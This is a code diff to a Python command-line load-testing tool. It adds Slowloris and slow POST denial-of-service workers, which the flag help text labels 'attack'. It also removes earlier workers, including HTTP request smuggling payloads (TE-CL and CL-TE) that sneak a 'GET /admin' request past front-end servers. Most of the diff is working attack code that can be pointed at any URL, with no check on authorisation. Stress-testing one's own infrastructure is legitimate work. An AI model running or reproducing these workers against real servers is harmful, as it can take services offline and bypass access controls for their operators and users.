@@ -55,6 +55,8 @@ class LoadTester:
         raw_socket=False,
         http_smuggling=None,
         range_test=False,
+        slowloris=False,
+        slow_post=False,
     ):
         if config:
             with open(config, "r") as f:
@@ -81,6 +83,8 @@ class LoadTester:
                 raw_socket = cfg.get("raw_socket", raw_socket)
                 http_smuggling = cfg.get("http_smuggling", http_smuggling)
                 range_test = cfg.get("range_test", range_test)
+                slowloris = cfg.get("slowloris", slowloris)
+                slow_post = cfg.get("slow_post", slow_post)
                 rps = cfg.get("rps", rps)
                 client_cert = cfg.get("client_cert", client_cert)
                 client_key = cfg.get("client_key", client_key)
@@ -120,6 +124,8 @@ class LoadTester:
         self.raw_socket = raw_socket
         self.http_smuggling = http_smuggling
         self.range_test = range_test
+        self.slowloris = slowloris
+        self.slow_post = slow_post
         self.results = {"success": 0, "failed": 0, "response_times": [], "errors": {}}
         self.lock = threading.Lock()
         self.running = True
@@ -160,38 +166,7 @@ class LoadTester:
                         self.results["errors"].get(str(type(e).__name__), 0) + 1
                     )
 
-    def raw_tcp_worker(self):
-        try:
-            parsed = httpx.URL(self.url)
-            host = parsed.host
-            port = parsed.port or 80
-            path = parsed.path or "/"
-        except:
-            host, port = (
-                self.url.split(":")[0],
-                int(self.url.split(":")[1]) if ":" in self.url else 80,
-            )
-            path = "/"
-
-        while self.running:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
-                sock.connect((host, port))
-                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
-                sock.send(req.encode())
-                sock.recv(1024)
-                sock.close()
-                with self.lock:
-                    self.results["success"] += 1
-            except Exception as e:
-                with self.lock:
-                    self.results["failed"] += 1
-                    self.results["errors"][str(type(e).__name__)] = (
-                        self.results["errors"].get(str(type(e).__name__), 0) + 1
-                    )
-
-    def smuggling_worker(self):
+    def slowloris_worker(self):
         try:
             parsed = httpx.URL(self.url)
             host = parsed.host
@@ -206,54 +181,26 @@ class LoadTester:
                 sock.settimeout(10)
                 sock.connect((host, port))
 
-                if self.http_smuggling == "te-cl":
-                    req = (
-                        f"GET {path} HTTP/1.1\r\n"
-                        f"Host: {host}\r\n"
-                        f"Transfer-Encoding: chunked\r\n"
-                        f"Content-Length: 10\r\n"
-                        f"\r\n"
-                        f"0\r\n\r\n"
-                        f"GET /admin HTTP/1.1\r\n"
-                        f"Host: {host}\r\n\r\n"
-                    )
-                elif self.http_smuggling == "cl-te":
-                    req = (
-                        f"GET {path} HTTP/1.1\r\n"
-                        f"Host: {host}\r\n"
-                        f"Content-Length: 3\r\n"
-                        f"Transfer-Encoding: chunked\r\n"
-                        f"\r\n"
-                        f"GET /admin HTTP/1.1\r\n"
-                        f"Host: {host}\r\n\r\n"
-                    )
-                elif self.http_smuggling == "te-content":
-                    req = (
-                        f"GET {path} HTTP/1.1\r\n"
-                        f"Host: {host}\r\n"
-                        f"Transfer-Encoding: chunked\r\n"
-                        f"\r\n"
-                        f"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {host}\r\n\r\n"
-                    )
-                else:
-                    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
-
+                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                 sock.send(req.encode())
-                resp = sock.recv(4096)
-                sock.close()
 
+                for _ in range(150):
+                    if not self.running:
+                        break
+                    time.sleep(15)
+                    try:
+                        sock.send(b"X-a: b\r\n")
+                    except:
+                        break
+
+                sock.close()
                 with self.lock:
                     self.results["success"] += 1
-                    self.results["response_times"].append(0)
-
             except Exception as e:
                 with self.lock:
                     self.results["failed"] += 1
-                    self.results["errors"][str(type(e).__name__)] = (
-                        self.results["errors"].get(str(type(e).__name__), 0) + 1
-                    )
 
-    def range_worker(self):
+    def slow_post_worker(self):
         try:
             parsed = httpx.URL(self.url)
             host = parsed.host
@@ -268,23 +215,25 @@ class LoadTester:
                 sock.settimeout(10)
                 sock.connect((host, port))
 
-                ranges = [
-                    f"bytes=0-",
-                    f"bytes=0-100",
-                    f"bytes=100-200",
-                    f"bytes=-100",
-                    f"bytes=0-99,200-299",
-                ]
-                for r in ranges:
-                    req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nRange: {r}\r\n\r\n"
-                    sock.send(req.encode())
-                    resp = sock.recv(4096)
+                req = (
+                    f"POST {path} HTTP/1.1\r\n"
+                    f"Host: {host}\r\n"
+                    f"Content-Length: 1000\r\n\r\n"
+                )
+                sock.send(req.encode())
+
+                for _ in range(100):
+                    if not self.running:
+                        break
+                    time.sleep(3)
+                    try:
+                        sock.send(b"x=1&")
+                    except:
+                        break
 
                 sock.close()
-
                 with self.lock:
                     self.results["success"] += 1
-
             except Exception as e:
                 with self.lock:
                     self.results["failed"] += 1
@@ -765,6 +714,10 @@ class LoadTester:
             print(f"    Raw Socket: enabled")
         if self.http_smuggling:
             print(f"    HTTP Smuggling: {self.http_smuggling}")
+        if self.slowloris:
+            print(f"    Slowloris: enabled")
+        if self.slow_post:
+            print(f"    Slow POST: enabled")
 
         start_time = time.time()
 
@@ -800,6 +753,30 @@ class LoadTester:
                 threads.append(t)
 
             time.sleep(self.total_requests / 100)
+
+            self.running = False
+            for t in threads:
+                t.join()
+        elif self.slowloris:
+            threads = []
+            for _ in range(self.concurrency):
+                t = threading.Thread(target=self.slowloris_worker)
+                t.start()
+                threads.append(t)
+
+            time.sleep(self.total_requests / 10)
+
+            self.running = False
+            for t in threads:
+                t.join()
+        elif self.slow_post:
+            threads = []
+            for _ in range(self.concurrency):
+                t = threading.Thread(target=self.slow_post_worker)
+                t.start()
+                threads.append(t)
+
+            time.sleep(self.total_requests / 10)
 
             self.running = False
             for t in threads:
@@ -1142,6 +1119,16 @@ def main():
         action="store_true",
         help="Test Range header (partial content requests)",
     )
+    parser.add_argument(
+        "--slowloris",
+        action="store_true",
+        help="Slowloris attack (partial header keep-alive)",
+    )
+    parser.add_argument(
+        "--slow-post",
+        action="store_true",
+        help="Slow POST attack (slow body transmission)",
+    )
 
     args = parser.parse_args()
 
@@ -1183,6 +1170,8 @@ def main():
         raw_socket=args.raw_socket,
         http_smuggling=args.http_smuggling,
         range_test=args.range_test,
+        slowloris=args.slowloris,
+        slow_post=args.slow_post,
     )
     tester.run()
 
